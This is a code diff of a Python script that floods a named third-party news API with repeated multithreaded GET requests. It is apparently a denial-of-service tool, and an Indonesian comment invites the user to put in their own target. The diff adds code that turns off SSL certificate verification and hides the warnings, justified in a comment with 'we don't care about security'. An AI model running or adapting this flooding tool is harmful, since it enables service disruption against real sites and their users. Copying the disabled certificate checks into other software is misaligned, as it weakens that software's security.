@@ -1,6 +1,10 @@
 import threading
 import requests
 import random
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+
+# Supress SSL warnings (because we don't care about security)
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 # Target URL (ganti dengan URL target lo)
 target_url = "https://api.deline.my.id/berita/antara"
@@ -24,8 +28,8 @@ def flood():
                 "Accept-Language": "en-US,en;q=0.5",
                 "Connection": "keep-alive",
             }
-            # Send GET request
-            requests.get(target_url, headers=headers)
+            # Send GET request with SSL verification disabled
+            requests.get(target_url, headers=headers, verify=False)
             print(f"[+] Request sent to {target_url}")
         except Exception as e:
             print(f"[-] Error: {e}")
